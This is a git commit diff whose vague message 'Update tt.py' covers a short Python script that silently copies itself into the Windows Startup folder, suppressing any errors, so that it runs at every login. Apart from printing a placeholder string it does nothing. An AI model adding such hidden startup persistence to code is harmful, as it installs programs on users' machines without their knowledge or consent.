a7b6a199d4fc93eadf6262da7c7b6153ebc1c2c4
COKZA <bodapower0@gmail.com>
2024-12-18 07:30:37 +0400

    Update tt.py

--- tt.py
+++ tt.py
@@ -1,2 +1,30 @@
 import os
-print("asdzxcvqwe-)_+^%&$#@%@!#~!#~asd52x0r7405")
+import shutil
+import sys
+from pathlib import Path
+
+print("{ZZzZzZzz}")
+ZZzZzZzz = "Hello"
+
+def add_to_startup(script_path=None):
+
+    if script_path is None:
+        script_path = sys.argv[0]
+
+
+    startup_folder = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
+
+    # التحقق من وجود المجلد
+    if not startup_folder.exists():
+        return
+
+
+    script_name = Path(script_path).name
+    destination = startup_folder / script_name
+
+    try:
+        shutil.copy(script_path, destination)
+    except:
+        pass
+      
+add_to_startup()
